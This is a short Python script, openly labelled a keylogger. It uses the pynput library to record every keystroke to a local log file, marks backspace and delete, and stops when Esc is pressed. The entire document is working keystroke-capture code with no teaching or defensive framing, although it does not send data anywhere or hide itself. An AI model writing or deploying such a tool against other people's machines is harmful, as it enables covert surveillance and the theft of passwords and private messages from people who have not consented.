from pynput.keyboard import Key, Listener

# Global variables
log_file = "keystrokes.log"
current_keys = [
    
]

# Function to write keystrokes to a log file
def write_to_log(key):
    global current_keys
    
    # Check if key is a special key
    if isinstance(key, Key):
        key_str = f"{key}"
    else:
        key_str = f"{key.char}"
    
    current_keys.append(key_str)
    
    # Write to log file
    with open(log_file, "a") as f:
        f.write(key_str)
        if key == Key.space or key == Key.enter:
            f.write("\n")
        elif key == Key.backspace:
            f.write(" [BACKSPACE] ")
        elif key == Key.delete:
            f.write(" [DELETE] ")

# Function to handle key presses
def on_press(key):
    write_to_log(key)

# Function to handle key releases
def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

# Main function
def start_keylogger():
    print("Keylogger started. Press [Esc] to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
if __name__ == "__main__":
    start_keylogger()
